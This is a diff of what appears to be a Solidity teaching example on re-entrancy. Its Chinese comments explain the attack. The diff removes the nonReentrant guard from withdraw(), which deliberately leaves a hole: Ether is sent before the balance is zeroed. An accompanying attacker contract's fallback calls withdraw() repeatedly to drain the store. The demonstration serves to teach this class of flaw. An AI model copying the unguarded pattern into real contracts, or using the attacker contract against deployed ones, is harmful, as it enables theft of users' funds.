@@ -6,7 +6,6 @@ contract CryptoCurrencyStore {
 
     bool public lockedState;
 
-    //這段modifier拿掉就能成功執行Re-Entrancy
     modifier nonReentrant() {
         require(!lockedState, "Block re-entrancy");
         lockedState = true;
@@ -18,11 +17,11 @@ contract CryptoCurrencyStore {
         balances[msg.sender] += msg.value; //存款
     }
 
-    function withdraw() public nonReentrant {
+    function withdraw() public {
         uint256 userBalance = balances[msg.sender]; //取得使用者存款資金
         require(userBalance > 0); //檢查使用者的存款資金是否大於0
 
-        (bool sent, ) = msg.sender.call{value: userBalance}("");
+        (bool sent, ) = msg.sender.call{value: userBalance}(""); //這段會觸發攻擊者的fallback
         require(sent, "Failed to send Ether"); //sent如為false代表使用者取款失敗
 
         balances[msg.sender] = 0; //資金領取完畢，將餘額設置為0。
@@ -47,7 +46,7 @@ contract AttackCryptoCurrencyStore {
         store = CryptoCurrencyStore(_cryptoCurrencyStoreAddress);
     }
 
-    //當智能合約接收到ether時會直接觸發fallback
+    //當智能合約接收到ether時會直接觸發fallback 對應到24行
     fallback() external payable {
         if (address(store).balance >= 1 ether) {
             store.withdraw();
